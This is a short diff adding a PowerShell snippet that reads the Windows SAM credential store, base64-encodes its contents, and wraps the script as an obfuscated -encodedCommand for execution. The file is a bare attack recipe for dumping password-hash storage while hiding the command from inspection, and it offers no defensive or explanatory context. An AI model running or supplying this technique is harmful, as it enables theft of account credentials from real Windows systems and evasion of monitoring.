@@ -1,0 +1,15 @@
+####CONVERT TO B64 COMMAND -- Dumps b64 encoded files
+#in powershell do
+
+$command = '$fileName = "C:\windows\system32\config\SAM"
+$fileContent = get-content $fileName
+$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
+$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
+Write-Host "$fileContentEncoded"'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+$encodedCommand
+
+
+#To execute 
+powershell -encodedCommand "$encodedCommand"
